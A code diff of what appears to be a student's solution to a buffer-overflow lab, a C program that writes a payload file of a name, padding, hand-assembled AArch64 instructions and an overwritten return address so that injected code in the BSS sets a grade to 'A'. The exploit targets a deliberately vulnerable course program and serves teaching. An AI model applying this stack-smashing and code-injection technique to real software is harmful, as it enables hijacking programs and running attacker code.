@@ -17,9 +17,9 @@ static const unsigned int lReturnAddress = 0x42006C;
 static const char sName[] = "Chinmay Bhandaru";
 
 
-/* Takes no parameters. Opens (and potentially creates) file 'dataB'.
- * Writes a name, nullbyte, padding, and a binary memory address to the
- * file. Returns 0 upon completion. */
+/* Takes no parameters. Opens (and potentially creates) file 'dataA'.
+ * Writes content to 'dataA' that results in a grade of 'A' being
+ * assigned by executing code in the BSS. Returns 0 upon completion. */
 int main(void) {
     int i;
     unsigned int uiInstr;
@@ -30,35 +30,33 @@ int main(void) {
     /* Print the stored name into dataB */
     fprintf(psFile, sName);
 
-    /* Add nullbytes to overrun the buffer and mark end of name */
+    /* Add nullbytes as padding and to mark end of the name*/
     for (i = 0; i < 4; i++) {
         putc(0, psFile);
     }
 
-    /* Add nullbytes to overrun the buffer and mark end of name */
-
+    /* mov x0, 'A' */
     uiInstr = MiniAssembler_mov(0, 'A');
-
     fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
 
+    /* adr x1, 0x420044 */
     uiInstr = MiniAssembler_adr(1, 0x420044,0x420070);
-
     fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
 
+    /* strb x0, [x1] */
     uiInstr = MiniAssembler_strb(0, 1);
-
     fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
 
+    /* b 0x40089c */
     uiInstr = MiniAssembler_b(0x40089c, 0x420078);
-
     fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
 
-    /* Add nullbytes to overrun the buffer and mark end of name */
+    /* Add nullbytes to overrun the buffer */
     for (i = 0; i < 12; i++) {
         putc(0, psFile);
     }
 
-    /* Overwrite x30 with address of 'grade = 'B'' instruction */
+    /* Overwrite x30 with address of printf call in main */
     fwrite(&lReturnAddress, sizeof(unsigned int), 1, psFile);
 
     /* Close the file */
